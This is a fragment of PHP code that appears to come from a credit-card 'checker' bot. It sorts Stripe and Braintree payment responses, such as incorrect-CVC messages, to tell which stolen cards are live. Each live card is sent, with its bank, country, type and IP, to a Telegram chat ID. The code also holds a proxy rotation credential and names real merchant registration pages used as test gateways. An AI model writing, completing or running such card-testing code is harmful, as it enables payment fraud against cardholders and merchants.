...
$rp1 = array(
  1 => 'yzqnhsel-rotate:3j8o6avknohh',
    ); 
...
elseif(strpos($Andryispro, "Your card's security code is incorrect.")){
    send_message(-1001443186949, "  $lista  𝘾𝘾𝙉 𝙇𝙄𝙑𝙀 | bank= $bank | country= $country | type=$type | [⍋] YOUR CARD SECURITY CODE IS INCORRECT :) << BY SPARSH ( GATEWAY = STRIPE 3 REQ  )  ");
 }
 elseif(strpos($Andryispro, "incorrect_cvc" )){
    send_message(-1001443186949, "  $lista  𝘾𝘾𝙉 𝙇𝙄𝙑𝙀 | bank= $bank | country= $country | type=$type | [⍋] YOUR CARD SECURITY CODE IS INCORRECT :) << BY SPARSH ( GATEWAY = STRIPE 3 REQ  )  ");
}
elseif(strpos($Andryispro,"/wishlist-member/?reg=" )){
    send_message(-1001443186949, "  $lista  † CCN LIVE †| ip=$ip | bank= $bank | country= $country | type=$type | [⍋] YOUR CARD SECURITY CODE IS INCORRECT :) << BY SPARSH ( GATEWAY = BRAINTREE )  ");
}
elseif(strpos($Andryispro,"https://betracingnationclub.com/?/register/continue&to=" )){
    send_message(-1001443186949, "  $lista  † CCN LIVE †| ip=$ip | bank= $bank | country= $country | type=$type | [⍋] YOUR CARD SECURITY CODE IS INCORRECT :) << BY SPARSH ( GATEWAY = BRAINTREE )  ");
}
 elseif(strpos($Andryispro, 'Your+cards+security+code+is+incorrect.' )){
    send_message(-1001443186949, "  $lista  𝘾𝘾𝙉 𝙇𝙄𝙑𝙀 | ip=$ip | bank= $bank | country= $country | type=$type | [⍋] YOUR CARD SECURITY CODE IS INCORRECT :) << BY SPARSH ( GATEWAY = STRIPE 3 REQ  )  ");
 }
 elseif(strpos($Andryispro, 'security code is invalid.')){
    send_message(-1001443186949, "  $lista  𝘾𝘾𝙉 𝙇𝙄𝙑𝙀 | ip=$ip | bank= $bank | country= $country | type=$type | [⍋] YOUR CARD SECURITY CODE IS INCORRECT :) << BY SPARSH ( GATEWAY = STRIPE 3 REQ  )  ");   
